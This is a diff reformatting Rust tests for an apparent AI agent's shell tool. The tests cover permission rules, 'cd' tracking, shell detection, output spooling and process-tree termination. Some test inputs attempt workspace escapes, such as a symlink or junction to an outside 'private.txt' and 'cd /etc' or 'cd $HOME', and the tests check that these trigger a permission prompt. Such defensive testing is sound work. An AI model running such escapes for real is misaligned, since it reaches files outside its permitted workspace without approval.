+        );
         for line in ["git reset HEAD a.rs", "git commit -m push", "git log --grep=clean"] {
             assert_eq!(decide(line), crate::permission::Decision::Allow, "{line}");
         }
@@ -705,14 +1005,35 @@ mod tests {
         let link = sandbox.ctx.workspace.join("linkdir");
         // A directory junction needs no elevation on Windows, unlike a symlink, so this always runs there.
         #[cfg(windows)]
-        let made = std::process::Command::new("cmd").args(["/c", "mklink", "/J"]).arg(&link).arg(&outside).output().unwrap().status.success();
+        let made = std::process::Command::new("cmd")
+            .args(["/c", "mklink", "/J"])
+            .arg(&link)
+            .arg(&outside)
+            .output()
+            .unwrap()
+            .status
+            .success();
         #[cfg(unix)]
         let made = std::os::unix::fs::symlink(&outside, &link).is_ok();
         assert!(made, "the link could not be made");
-        assert_eq!(decide("ls linkdir"), crate::permission::Decision::Ask, "a bare name linking outside the workspace asks");
+        assert_eq!(
+            decide("ls linkdir"),
+            crate::permission::Decision::Ask,
+            "a bare name linking outside the workspace asks"
+        );
         assert_eq!(decide("cat linkdir/private.txt"), crate::permission::Decision::Ask);
-        sandbox.ctx.engine.permissions.set_policy(crate::permission::Policy { rules: vec![crate::permission::Rule { kind: "bash".into(), pattern: "git log*".into(), decision: crate::permission::Decision::Ask }] });
-        assert_eq!(decide("git log --oneline"), crate::permission::Decision::Ask, "a rule still decides first");
+        sandbox.ctx.engine.permissions.set_policy(crate::permission::Policy {
+            rules: vec![crate::permission::Rule {
+                kind: "bash".into(),
+                pattern: "git log*".into(),
+                decision: crate::permission::Decision::Ask,
+            }],
+        });
+        assert_eq!(
+            decide("git log --oneline"),
+            crate::permission::Decision::Ask,
+            "a rule still decides first"
+        );
     }
 
     #[test]
@@ -723,30 +1044,59 @@ mod tests {
         }
         std::fs::write(root.join("bin/bash.exe"), "").unwrap();
         for git in ["cmd/git.exe", "bin/git.exe", "mingw64/bin/git.exe"] {
-            assert_eq!(bash_beside(&root.join(git)), Some(root.join("bin").join("bash.exe")), "{git}");
+            assert_eq!(
+                bash_beside(&root.join(git)),
+                Some(root.join("bin").join("bash.exe")),
+                "{git}"
+            );
         }
         assert_eq!(bash_beside(&std::env::temp_dir().join("elsewhere/git.exe")), None);
         std::fs::remove_dir_all(&root).unwrap();
         assert!(matches!(shell_for("D:/tools/Git/bin/bash.exe".into()), Shell::Bash(_)));
         assert!(matches!(shell_for("/usr/bin/zsh".into()), Shell::Bash(_)));
-        assert!(matches!(shell_for("C:/Program Files/PowerShell/7/pwsh.exe".into()), Shell::PowerShell(_)));
+        assert!(matches!(
+            shell_for("C:/Program Files/PowerShell/7/pwsh.exe".into()),
+            Shell::PowerShell(_)
+        ));
     }
 
     #[test]
     fn the_model_is_told_git_bash_on_windows_is_unix_bash() {
         let bash = Shell::Bash("bash".into());
         let windows = shell_note(&bash, true);
-        assert!(windows.contains("Unix bash") && windows.contains("/dev/null") && windows.contains("never `NUL`") && windows.contains("never `cd /d`"), "{windows}");
+        assert!(
+            windows.contains("Unix bash")
+                && windows.contains("/dev/null")
+                && windows.contains("never `NUL`")
+                && windows.contains("never `cd /d`"),
+            "{windows}"
+        );
         assert_eq!(shell_note(&bash, false), "bash");
         assert!(shell_note(&Shell::PowerShell("pwsh".into()), true).starts_with("PowerShell 7"));
         let legacy = Shell::PowerShell("C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe".into());
         assert!(shell_note(&legacy, true).starts_with("Windows PowerShell 5.1"));
         let legacy_spec = Bash::with(legacy).spec().description;
-        assert!(legacy_spec.contains("`&&` does not exist") && !legacy_spec.contains("chain dependent steps with `&&`"), "{legacy_spec}");
-        assert!(Bash::with(Shell::PowerShell("pwsh".into())).spec().description.contains("chain dependent steps with `&&`"));
+        assert!(
+            legacy_spec.contains("`&&` does not exist") && !legacy_spec.contains("chain dependent steps with `&&`"),
+            "{legacy_spec}"
+        );
+        assert!(
+            Bash::with(Shell::PowerShell("pwsh".into()))
+                .spec()
+                .description
+                .contains("chain dependent steps with `&&`")
+        );
         let spec = Bash::with(bash).spec();
-        assert!(spec.description.contains("/dev/null") == cfg!(windows), "{}", spec.description);
-        assert!(!spec.description.contains('{'), "every placeholder is filled: {}", spec.description);
+        assert!(
+            spec.description.contains("/dev/null") == cfg!(windows),
+            "{}",
+            spec.description
+        );
+        assert!(
+            !spec.description.contains('{'),
+            "every placeholder is filled: {}",
+            spec.description
+        );
     }
 
     #[test]
@@ -756,17 +1106,45 @@ mod tests {
         let bash = Bash::with(Shell::Bash("bash".into()));
         let commands = |line: &str| bash.ask(&sandbox.ctx, &json!({ "command": line })).unwrap().commands;
         assert_eq!(commands("cd crates && cargo test").unwrap(), ["cargo test"]);
-        assert_eq!(commands("cd crates && cd a && cargo build && cd ../.. && git status").unwrap(), ["cargo build", "git status"], "followed along the chain");
-        assert_eq!(commands("cd src").unwrap(), Vec::<String>::new(), "a move alone changes nothing");
-        assert_eq!(commands("cd .. && cargo test").unwrap(), ["cd ..", "cargo test"], "leaving the workspace asks");
-        assert_eq!(commands("cd crates && cd ../.. && cd ws && ls").unwrap(), ["cd ../..", "cd ws", "ls"], "once outside, every later move asks");
-        for line in ["cd ~ && ls", "cd - && ls", "cd $HOME && ls", "cd /etc && ls", "cd -P crates && ls", "cd cra* && ls"] {
+        assert_eq!(
+            commands("cd crates && cd a && cargo build && cd ../.. && git status").unwrap(),
+            ["cargo build", "git status"],
+            "followed along the chain"
+        );
+        assert_eq!(
+            commands("cd src").unwrap(),
+            Vec::<String>::new(),
+            "a move alone changes nothing"
+        );
+        assert_eq!(
+            commands("cd .. && cargo test").unwrap(),
+            ["cd ..", "cargo test"],
+            "leaving the workspace asks"
+        );
+        assert_eq!(
+            commands("cd crates && cd ../.. && cd ws && ls").unwrap(),
+            ["cd ../..", "cd ws", "ls"],
+            "once outside, every later move asks"
+        );
+        for line in [
+            "cd ~ && ls",
+            "cd - && ls",
+            "cd $HOME && ls",
+            "cd /etc && ls",
+            "cd -P crates && ls",
+            "cd cra* && ls",
+        ] {
             assert_eq!(commands(line).unwrap().len(), 2, "{line}");
         }
         let pwsh = Bash::with(Shell::PowerShell("pwsh".into()));
-        let ask = pwsh.ask(&sandbox.ctx, &json!({ "command": "Set-Location crates; cargo test" })).unwrap();
+        let ask = pwsh
+            .ask(&sandbox.ctx, &json!({ "command": "Set-Location crates; cargo test" }))
+            .unwrap();
         assert_eq!(ask.commands.unwrap(), ["cargo test"]);
-        assert_eq!(ask.pattern, "Set-Location crates; cargo test", "the user still sees the whole line");
+        assert_eq!(
+            ask.pattern, "Set-Location crates; cargo test",
+            "the user still sees the whole line"
+        );
     }
 
     #[tokio::test]
@@ -786,7 +1164,11 @@ mod tests {
         let out = running.await.unwrap().unwrap();
         assert!(started.elapsed() < Duration::from_secs(3), "Stop is prompt");
         assert!(bash.failed(&out) && out.metadata["stopped"] == true);
-        assert!(out.output.starts_with("early") && out.output.contains("stopped the command"), "{}", out.output);
+        assert!(
+            out.output.starts_with("early") && out.output.contains("stopped the command"),
+            "{}",
+            out.output
+        );
     }
 
     #[tokio::test]
@@ -796,16 +1178,26 @@ mod tests {
         let bash = Bash::detect();
         let command = match bash.shell {
             Shell::Bash(_) => "sleep 30 & echo done",
-            Shell::PowerShell(_) => "Start-Process -NoNewWindow pwsh -ArgumentList '-NoProfile','-Command','Start-Sleep 30'; Write-Output done",
+            Shell::PowerShell(_) => {
+                "Start-Process -NoNewWindow pwsh -ArgumentList '-NoProfile','-Command','Start-Sleep 30'; Write-Output done"
+            }
         };
         let started = std::time::Instant::now();
         let out = bash.run(&sandbox.ctx, json!({ "command": command })).await.unwrap();
-        assert!(started.elapsed() < Duration::from_secs(10), "no limit, yet it returns: {:?}", started.elapsed());
+        assert!(
+            started.elapsed() < Duration::from_secs(10),
+            "no limit, yet it returns: {:?}",
+            started.elapsed()
+        );
         assert!(out.output.starts_with("done"), "{}", out.output);
         assert_eq!(out.metadata["exit"], 0);
         assert!(!bash.failed(&out));
         if matches!(bash.shell, Shell::Bash(_)) {
-            assert!(out.output.contains("Background processes still held the output open"), "{}", out.output);
+            assert!(
+                out.output.contains("Background processes still held the output open"),
+                "{}",
+                out.output
+            );
         }
     }
 
@@ -818,12 +1210,19 @@ mod tests {
             Shell::PowerShell(_) => "1..40000 | ForEach-Object { \"line $_\" }",
         };
         let out = bash.run(&sandbox.ctx, json!({ "command": command })).await.unwrap();
-        assert!(out.output.len() < super::super::spool::HEAD_BYTES + super::super::spool::TAIL_BYTES + 400, "{}", out.output.len());
+        assert!(
+            out.output.len() < super::super::spool::HEAD_BYTES + super::super::spool::TAIL_BYTES + 400,
+            "{}",
+            out.output.len()
+        );
         assert!(out.output.starts_with("line 1") && out.output.contains("line 40000"));
         let file = out.metadata["outputFile"].as_str().expect("the whole output is kept");
         let whole = std::fs::read_to_string(file).unwrap();
         assert_eq!(whole.lines().count(), 40000);
-        assert_eq!(out.metadata["outputBytes"].as_u64(), Some(std::fs::metadata(file).unwrap().len()));
+        assert_eq!(
+            out.metadata["outputBytes"].as_u64(),
+            Some(std::fs::metadata(file).unwrap().len())
+        );
     }
 }
 
@@ -838,7 +1237,9 @@ mod tree_tests {
         let bash = Bash::detect();
         let command = match bash.shell {
             Shell::Bash(_) => "(sleep 2; echo late > late.txt) & sleep 30",
-            Shell::PowerShell(_) => "Start-Process pwsh -WindowStyle Hidden -ArgumentList '-NoProfile','-Command','Start-Sleep 2; Set-Content late.txt late'; Start-Sleep 30",
+            Shell::PowerShell(_) => {
+                "Start-Process pwsh -WindowStyle Hidden -ArgumentList '-NoProfile','-Command','Start-Sleep 2; Set-Content late.txt late'; Start-Sleep 30"
+            }
         };
         let ctx = sandbox.ctx_clone();
         let abort = ctx.abort.clone();
@@ -848,7 +1249,10 @@ mod tree_tests {
         let result = running.await.unwrap().unwrap();
         assert_eq!(result.metadata["stopped"], true);
         tokio::time::sleep(Duration::from_millis(3000)).await;
-        assert!(!sandbox.ctx.workspace.join("late.txt").exists(), "a descendant kept running after Stop");
+        assert!(
+            !sandbox.ctx.workspace.join("late.txt").exists(),
+            "a descendant kept running after Stop"
+        );
     }
 
     #[tokio::test]
@@ -857,14 +1261,18 @@ mod tree_tests {
         let bash = Bash::detect();
         let command = match bash.shell {
             Shell::Bash(_) => "(sleep 2; echo late > dropped.txt) & sleep 30",
-            Shell::PowerShell(_) => "Start-Process pwsh -WindowStyle Hidden -ArgumentList '-NoProfile','-Command','Start-Sleep 2; Set-Content dropped.txt late'; Start-Sleep 30",
+            Shell::PowerShell(_) => {
+                "Start-Process pwsh -WindowStyle Hidden -ArgumentList '-NoProfile','-Command','Start-Sleep 2; Set-Content dropped.txt late'; Start-Sleep 30"
+            }
         };
         let ctx = sandbox.ctx_clone();
         let handle = tokio::spawn(async move { Bash::detect().run(&ctx, json!({ "command": command })).await });
         tokio::time::sleep(Duration::from_millis(600)).await;
         handle.abort();
         tokio::time::sleep(Duration::from_millis(3000)).await;
-        assert!(!sandbox.ctx.workspace.join("dropped.txt").exists(), "a descendant survived the future being dropped");
+        assert!(
+            !sandbox.ctx.workspace.join("dropped.txt").exists(),
+            "a descendant survived the future being dropped"
+        );
     }
 }
-
